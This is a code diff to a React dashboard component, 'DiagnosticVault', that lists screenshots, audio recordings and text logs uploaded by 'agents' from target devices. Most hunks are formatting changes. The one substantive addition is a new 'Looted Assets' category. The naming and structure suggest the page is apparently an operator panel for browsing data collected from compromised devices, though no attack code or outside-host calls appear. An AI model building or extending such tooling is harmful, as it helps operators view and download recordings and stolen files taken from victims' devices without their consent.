@@ -9,13 +9,39 @@ import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sh
 import { ScrollArea } from "@/components/ui/scroll-area";
 import { AspectRatio } from "@/components/ui/aspect-ratio";
 import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group";
-import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu";
-import { Breadcrumb, BreadcrumbItem, BreadcrumbLink, BreadcrumbList, BreadcrumbPage, BreadcrumbSeparator } from "@/components/ui/breadcrumb";
+import {
+  DropdownMenu,
+  DropdownMenuContent,
+  DropdownMenuItem,
+  DropdownMenuTrigger,
+} from "@/components/ui/dropdown-menu";
+import {
+  Breadcrumb,
+  BreadcrumbItem,
+  BreadcrumbLink,
+  BreadcrumbList,
+  BreadcrumbPage,
+  BreadcrumbSeparator,
+} from "@/components/ui/breadcrumb";
 import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";
 import {
-  Search, Download, Eye, FileImage, FileAudio, FileText,
-  FolderArchive, Grid3X3, List, MoreVertical, Copy,
-  Music, X, Monitor, ChevronDown, Folder, Layers
+  Search,
+  Download,
+  Eye,
+  FileImage,
+  FileAudio,
+  FileText,
+  FolderArchive,
+  Grid3X3,
+  List,
+  MoreVertical,
+  Copy,
+  Music,
+  X,
+  Monitor,
+  ChevronDown,
+  Folder,
+  Layers,
 } from "lucide-react";
 import { useTenant } from "@/hooks/use-tenant";
 import { useDiagnosticFiles, DiagnosticEntry } from "@/hooks/use-diagnostic-files";
@@ -27,18 +53,21 @@ const typeIcons: Record<string, React.ReactNode> = {
   image: <FileImage className="h-4 w-4 text-primary" />,
   audio: <FileAudio className="h-4 w-4 text-[hsl(var(--warning))]" />,
   text: <FileText className="h-4 w-4 text-muted-foreground" />,
+  loot: <FolderArchive className="h-4 w-4 text-[hsl(var(--destructive))]" />, // Add this line
 };
 
 const typeBadgeColors: Record<string, string> = {
   image: "bg-primary/10 text-primary border-primary/20",
   audio: "bg-[hsl(var(--warning))]/10 text-[hsl(var(--warning))] border-[hsl(var(--warning))]/20",
   text: "bg-muted text-muted-foreground border-border/50",
+  loot: "bg-destructive/10 text-destructive border-destructive/20", // Add this line
 };
 
 const categoryLabels: Record<string, string> = {
   image: "Screenshots",
   audio: "Audio Recordings",
   text: "Text Logs",
+  loot: "Looted Assets",
 };
 
 function getFileName(url: string) {
@@ -67,7 +96,11 @@ function AssetActions({ file }: { file: DiagnosticEntry }) {
   return (
     <DropdownMenu>
       <DropdownMenuTrigger asChild>
-        <Button variant="ghost" size="icon" className="h-8 w-8 hover:bg-primary/10 hover:text-primary transition-colors">
+        <Button
+          variant="ghost"
+          size="icon"
+          className="h-8 w-8 hover:bg-primary/10 hover:text-primary transition-colors"
+        >
           <MoreVertical className="h-4 w-4" />
         </Button>
       </DropdownMenuTrigger>
@@ -75,7 +108,10 @@ function AssetActions({ file }: { file: DiagnosticEntry }) {
         <DropdownMenuItem onClick={() => copyToClipboard(file.file_url)} className="gap-2 cursor-pointer">
           <Copy className="h-4 w-4" /> Copy Resource Link
         </DropdownMenuItem>
-        <DropdownMenuItem onClick={() => downloadFile(file.file_url, getFileName(file.file_url))} className="gap-2 cursor-pointer">
+        <DropdownMenuItem
+          onClick={() => downloadFile(file.file_url, getFileName(file.file_url))}
+          className="gap-2 cursor-pointer"
+        >
           <Download className="h-4 w-4" /> Download
         </DropdownMenuItem>
       </DropdownMenuContent>
@@ -83,7 +119,15 @@ function AssetActions({ file }: { file: DiagnosticEntry }) {
   );
 }
 
-function ImagePreviewDialog({ file, open, onClose }: { file: DiagnosticEntry | null; open: boolean; onClose: () => void }) {
+function ImagePreviewDialog({
+  file,
+  open,
+  onClose,
+}: {
+  file: DiagnosticEntry | null;
+  open: boolean;
+  onClose: () => void;
+}) {
   if (!file) return null;
   return (
     <Dialog open={open} onOpenChange={(v) => !v && onClose()}>
@@ -91,7 +135,11 @@ function ImagePreviewDialog({ file, open, onClose }: { file: DiagnosticEntry | n
         <DialogHeader>
           <DialogTitle className="text-sm font-medium truncate">{getFileName(file.file_url)}</DialogTitle>
         </DialogHeader>
-        <img src={file.file_url} alt={getFileName(file.file_url)} className="w-full rounded-lg object-contain max-h-[70vh]" />
+        <img
+          src={file.file_url}
+          alt={getFileName(file.file_url)}
+          className="w-full rounded-lg object-contain max-h-[70vh]"
+        />
         <p className="text-xs text-muted-foreground mt-2">
           Device: <span className="font-mono">{file.target_id}</span> · {new Date(file.created_at).toLocaleString()}
         </p>
@@ -100,7 +148,15 @@ function ImagePreviewDialog({ file, open, onClose }: { file: DiagnosticEntry | n
   );
 }
 
-function TextPreviewSheet({ file, open, onClose }: { file: DiagnosticEntry | null; open: boolean; onClose: () => void }) {
+function TextPreviewSheet({
+  file,
+  open,
+  onClose,
+}: {
+  file: DiagnosticEntry | null;
+  open: boolean;
+  onClose: () => void;
+}) {
   if (!file) return null;
   return (
     <Sheet open={open} onOpenChange={(v) => !v && onClose()}>
@@ -113,7 +169,12 @@ function TextPreviewSheet({ file, open, onClose }: { file: DiagnosticEntry | nul
             Device: <span className="font-mono">{file.target_id}</span> · {new Date(file.created_at).toLocaleString()}
           </p>
           <ScrollArea className="h-[calc(100vh-10rem)] rounded-lg border border-border/30 bg-[hsl(var(--terminal-bg))] p-4">
-            <iframe src={file.file_url} title={getFileName(file.file_url)} className="w-full min-h-[60vh] bg-transparent text-foreground" sandbox="" />
+            <iframe
+              src={file.file_url}
+              title={getFileName(file.file_url)}
+              className="w-full min-h-[60vh] bg-transparent text-foreground"
+              sandbox=""
+            />
           </ScrollArea>
         </div>
       </SheetContent>
@@ -121,7 +182,15 @@ function TextPreviewSheet({ file, open, onClose }: { file: DiagnosticEntry | nul
   );
 }
 
-function AudioPreviewDialog({ file, open, onClose }: { file: DiagnosticEntry | null; open: boolean; onClose: () => void }) {
+function AudioPreviewDialog({
+  file,
+  open,
+  onClose,
+}: {
+  file: DiagnosticEntry | null;
+  open: boolean;
+  onClose: () => void;
+}) {
   if (!file) return null;
   return (
     <Dialog open={open} onOpenChange={(v) => !v && onClose()}>
@@ -133,7 +202,9 @@ function AudioPreviewDialog({ file, open, onClose }: { file: DiagnosticEntry | n
           <div className="h-20 w-20 rounded-2xl bg-[hsl(var(--warning))]/10 flex items-center justify-center">
             <Music className="h-10 w-10 text-[hsl(var(--warning))]" />
           </div>
-          <audio controls className="w-full" src={file.file_url}>Your browser does not support audio playback.</audio>
+          <audio controls className="w-full" src={file.file_url}>
+            Your browser does not support audio playback.
+          </audio>
           <p className="text-xs text-muted-foreground">
             Device: <span className="font-mono">{file.target_id}</span> · {new Date(file.created_at).toLocaleString()}
           </p>
@@ -145,11 +216,18 @@ function AudioPreviewDialog({ file, open, onClose }: { file: DiagnosticEntry | n
 
 function AssetGridCard({ file, onPreview }: { file: DiagnosticEntry; onPreview: (f: DiagnosticEntry) => void }) {
   return (
-    <Card className="glass-card group hover:border-primary/30 transition-all duration-300 overflow-hidden cursor-pointer" onClick={() => onPreview(file)}>
+    <Card
+      className="glass-card group hover:border-primary/30 transition-all duration-300 overflow-hidden cursor-pointer"
+      onClick={() => onPreview(file)}
+    >
       <div className="relative">
         {file.type === "image" ? (
           <AspectRatio ratio={16 / 10}>
-            <img src={file.file_url} alt={getFileName(file.file_url)} className="object-cover w-full h-full rounded-t-lg group-hover:scale-105 transition-transform duration-500" />
+            <img
+              src={file.file_url}
+              alt={getFileName(file.file_url)}
+              className="object-cover w-full h-full rounded-t-lg group-hover:scale-105 transition-transform duration-500"
+            />
           </AspectRatio>
         ) : file.type === "audio" ? (
           <AspectRatio ratio={16 / 10}>
@@ -169,7 +247,15 @@ function AssetGridCard({ file, onPreview }: { file: DiagnosticEntry; onPreview: 
           </AspectRatio>
         )}
         <div className="absolute inset-0 bg-background/60 opacity-0 group-hover:opacity-100 transition-opacity duration-300 flex items-center justify-center gap-2 rounded-t-lg">
-          <Button size="sm" variant="secondary" className="gap-1.5 text-xs" onClick={(e) => { e.stopPropagation(); onPreview(file); }}>
+          <Button
+            size="sm"
+            variant="secondary"
+            className="gap-1.5 text-xs"
+            onClick={(e) => {
+              e.stopPropagation();
+              onPreview(file);
+            }}
+          >
             <Eye className="h-3.5 w-3.5" /> Preview
           </Button>
         </div>
@@ -180,7 +266,9 @@ function AssetGridCard({ file, onPreview }: { file: DiagnosticEntry; onPreview: 
           <AssetActions file={file} />
         </div>
         <div className="flex items-center gap-2">
-          <Badge variant="outline" className={`${typeBadgeColors[file.type]} text-[10px] rounded-full`}>{file.type.toUpperCase()}</Badge>
+          <Badge variant="outline" className={`${typeBadgeColors[file.type]} text-[10px] rounded-full`}>
+            {file.type.toUpperCase()}
+          </Badge>
           <span className="text-[10px] text-muted-foreground font-mono truncate">{file.target_id}</span>
         </div>
         <p className="text-[10px] text-muted-foreground/60">{new Date(file.created_at).toLocaleString()}</p>
@@ -209,8 +297,12 @@ function FileCategorySection({
       <CollapsibleTrigger className="flex items-center gap-2 w-full p-3 rounded-lg hover:bg-muted/20 transition-colors group">
         <Folder className="h-4 w-4 text-primary" />
         <span className="text-sm font-semibold text-foreground">{categoryLabels[type] || type}</span>
-        <Badge variant="outline" className="ml-1 text-[10px] rounded-full border-border/50">{files.length}</Badge>
-        <ChevronDown className={`h-4 w-4 ml-auto text-muted-foreground transition-transform duration-200 ${open ? "" : "-rotate-90"}`} />
+        <Badge variant="outline" className="ml-1 text-[10px] rounded-full border-border/50">
+          {files.length}
+        </Badge>
+        <ChevronDown
+          className={`h-4 w-4 ml-auto text-muted-foreground transition-transform duration-200 ${open ? "" : "-rotate-90"}`}
+        />
       </CollapsibleTrigger>
       <CollapsibleContent className="mt-2">
         {viewMode === "grid" ? (
@@ -225,26 +317,49 @@ function FileCategorySection({
               <Table>
                 <TableHeader>
                   <TableRow className="border-border/30 hover:bg-transparent">
-                    <TableHead className="text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">File</TableHead>
-                    <TableHead className="hidden md:table-cell text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">Device ID</TableHead>
-                    <TableHead className="hidden lg:table-cell text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">Timestamp</TableHead>
-                    <TableHead className="text-right text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">Actions</TableHead>
+                    <TableHead className="text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">
+                      File
+                    </TableHead>
+                    <TableHead className="hidden md:table-cell text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">
+                      Device ID
+                    </TableHead>
+                    <TableHead className="hidden lg:table-cell text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">
+                      Timestamp
+                    </TableHead>
+                    <TableHead className="text-right text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">
+                      Actions
+                    </TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
                   {files.map((file) => (
-                    <TableRow key={file.id} className="border-border/20 table-row-hover cursor-pointer" onClick={() => onPreview(file)}>
+                    <TableRow
+                      key={file.id}
+                      className="border-border/20 table-row-hover cursor-pointer"
+                      onClick={() => onPreview(file)}
+                    >
                       <TableCell>
                         <div className="flex items-center gap-2">
                           {typeIcons[file.type]}
-                          <span className="text-sm font-medium truncate max-w-[200px]">{getFileName(file.file_url)}</span>
+                          <span className="text-sm font-medium truncate max-w-[200px]">
+                            {getFileName(file.file_url)}
+                          </span>
                         </div>
                       </TableCell>
-                      <TableCell className="hidden md:table-cell font-mono text-sm text-muted-foreground">{file.target_id}</TableCell>
-                      <TableCell className="hidden lg:table-cell text-sm text-muted-foreground">{new Date(file.created_at).toLocaleString()}</TableCell>
+                      <TableCell className="hidden md:table-cell font-mono text-sm text-muted-foreground">
+                        {file.target_id}
+                      </TableCell>
+                      <TableCell className="hidden lg:table-cell text-sm text-muted-foreground">
+                        {new Date(file.created_at).toLocaleString()}
+                      </TableCell>
                       <TableCell className="text-right" onClick={(e) => e.stopPropagation()}>
                         <div className="flex items-center justify-end gap-1">
-                          <Button variant="ghost" size="icon" className="h-8 w-8 hover:bg-primary/10 hover:text-primary transition-colors" onClick={() => onPreview(file)}>
+                          <Button
+                            variant="ghost"
+                            size="icon"
+                            className="h-8 w-8 hover:bg-primary/10 hover:text-primary transition-colors"
+                            onClick={() => onPreview(file)}
+                          >
                             <Eye className="h-4 w-4" />
                           </Button>
                           <AssetActions file={file} />
@@ -308,7 +423,7 @@ export default function DiagnosticVault() {
     return groups;
   }, [filtered]);
 
-  const categoryOrder = ["image", "audio", "text"];
+  const categoryOrder = ["image", "audio", "text", "loot"];
   const sortedCategories = categoryOrder.filter((t) => groupedFiles[t]?.length);
 
   function handlePreview(file: DiagnosticEntry) {
@@ -341,7 +456,9 @@ export default function DiagnosticVault() {
               >
                 <FolderArchive className="h-4 w-4 shrink-0" />
                 <span className="truncate">All Devices</span>
-                <Badge variant="outline" className="ml-auto text-[10px] rounded-full border-border/50 shrink-0">{totalCount}</Badge>
+                <Badge variant="outline" className="ml-auto text-[10px] rounded-full border-border/50 shrink-0">
+                  {totalCount}
+                </Badge>
               </button>
 
               {devices.map((d) => (
@@ -356,7 +473,9 @@ export default function DiagnosticVault() {
                 >
                   <Monitor className="h-4 w-4 shrink-0" />
                   <span className="truncate font-mono text-xs">{d.id}</span>
-                  <Badge variant="outline" className="ml-auto text-[10px] rounded-full border-border/50 shrink-0">{d.count}</Badge>
+                  <Badge variant="outline" className="ml-auto text-[10px] rounded-full border-border/50 shrink-0">
+                    {d.count}
+                  </Badge>
                 </button>
               ))}
 
@@ -383,9 +502,7 @@ export default function DiagnosticVault() {
             </BreadcrumbItem>
             <BreadcrumbSeparator />
             <BreadcrumbItem>
-              <BreadcrumbPage className="font-mono text-sm">
-                {selectedDevice || "All Devices"}
-              </BreadcrumbPage>
+              <BreadcrumbPage className="font-mono text-sm">{selectedDevice || "All Devices"}</BreadcrumbPage>
             </BreadcrumbItem>
           </BreadcrumbList>
         </Breadcrumb>
@@ -420,10 +537,16 @@ export default function DiagnosticVault() {
                 onValueChange={(v) => v && setViewMode(v as ViewMode)}
                 className="bg-muted/20 rounded-lg p-0.5"
               >
-                <ToggleGroupItem value="grid" className="h-8 w-8 p-0 rounded-md data-[state=on]:bg-primary data-[state=on]:text-primary-foreground transition-all">
+                <ToggleGroupItem
+                  value="grid"
+                  className="h-8 w-8 p-0 rounded-md data-[state=on]:bg-primary data-[state=on]:text-primary-foreground transition-all"
+                >
                   <Grid3X3 className="h-4 w-4" />
                 </ToggleGroupItem>
-                <ToggleGroupItem value="list" className="h-8 w-8 p-0 rounded-md data-[state=on]:bg-primary data-[state=on]:text-primary-foreground transition-all">
+                <ToggleGroupItem
+                  value="list"
+                  className="h-8 w-8 p-0 rounded-md data-[state=on]:bg-primary data-[state=on]:text-primary-foreground transition-all"
+                >
                   <List className="h-4 w-4" />
                 </ToggleGroupItem>
               </ToggleGroup>
@@ -449,8 +572,8 @@ export default function DiagnosticVault() {
                 {search
                   ? "Try adjusting your search query."
                   : selectedDevice
-                  ? "This device has no uploaded diagnostics yet."
-                  : "Files will appear here when your agents upload diagnostics."}
+                    ? "This device has no uploaded diagnostics yet."
+                    : "Files will appear here when your agents upload diagnostics."}
               </p>
               {search && (
                 <Button variant="ghost" size="sm" className="mt-4 gap-1.5 text-xs" onClick={() => setSearch("")}>
